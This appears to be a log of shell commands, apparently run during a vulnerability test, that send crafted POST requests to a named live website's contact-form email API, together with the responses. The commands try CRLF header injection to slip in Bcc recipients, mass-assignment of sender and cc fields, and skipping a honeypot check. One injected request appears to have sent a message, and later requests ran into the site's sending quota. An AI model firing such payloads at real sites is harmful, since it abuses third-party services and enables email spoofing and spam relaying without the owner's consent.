@@ -1,0 +1,26 @@
+# command: cd /work; UA="Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
+send() { code=$(curl -s -o /tmp/r.txt -w "%{http_code}" -X POST "https://www.infinitycapital.bh/api/send" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: $UA" -H "Accept: */*" -H "Accept-Encoding: identity" -H "Referer: https://www.infinitycapital.bh/contact" "$@"); echo "HTTP=$code sz=$(stat -c%s /tmp/r.txt) | $(head -c 260 /tmp/r.txt)"; }
+echo "--- CRLF in fname (Bcc injection attempt) ---"
+send --data-urlencode "fname=x
+Bcc: vapt" --data "lname=B&areacode=388&tel=1&cname=c&subject=s&msg=m&check=1&targets=vapt@www.infinitycapital.bh"
+echo "--- CRLF in targets ---"
+send --data-urlencode "targets=x
+Bcc: vapt
+" --data "fname=A&lname=B&areacode=388&tel=1&cname=c&subject=s&msg=m&check=1"
+echo "--- mass-assign from/replyTo/cc ---"
+curl -s -o /tmp/m.txt -w "HTTP=%{http_code} " -X POST "https://www.infinitycapital.bh/api/send" -H "User-Agent: $UA" -F "fname=A" -F "lname=B" -F "areacode=388" -F "tel=1" -F "cname=c" -F "subject=s" -F "msg=m" -F "check=1" -F "targets=vapt@www.infinitycapital.bh" -F "from=vapt@www.infinitycapital.bh" -F "replyTo=vapt@www.infinitycapital.bh" -F "cc=vapt@www.infinitycapital.bh"; head -c 200 /tmp/m.txt; echo
+echo "--- honeypot omitted ---"
+curl -s -o /tmp/c.txt -w "HTTP=%{http_code} " -X POST "https://www.infinitycapital.bh/api/send" -H "User-Agent: $UA" -F "fname=A" -F "lname=B" -F "areacode=388" -F "tel=1" -F "cname=c" -F "subject=s" -F "msg=m" -F "targets=vapt@www.infinitycapital.bh"; head -c 200 /tmp/c.txt; echo
+# tool: head
+# exit_code: 0
+# ts: 2026-09-30T11:33:10.234477+00:00
+# ---
+
+--- CRLF in fname (Bcc injection attempt) ---
+HTTP=200 sz=67 | {"data":{"id":"01a0f216-fd9f-705c-b0ad-f5cb74c1f9ec"},"error":null}
+--- CRLF in targets ---
+HTTP=200 sz=194 | {"data":null,"error":{"message":"Invalid `to` field. The email address needs to follow the `email@example.com` or `Name <email@example.com>` format.","name":"validation_error","statusCode":422}}
+--- mass-assign from/replyTo/cc ---
+HTTP=200 {"data":null,"error":{"statusCode":429,"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded"}}
+--- honeypot omitted ---
+HTTP=200 {"data":null,"error":{"statusCode":429,"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded"}}
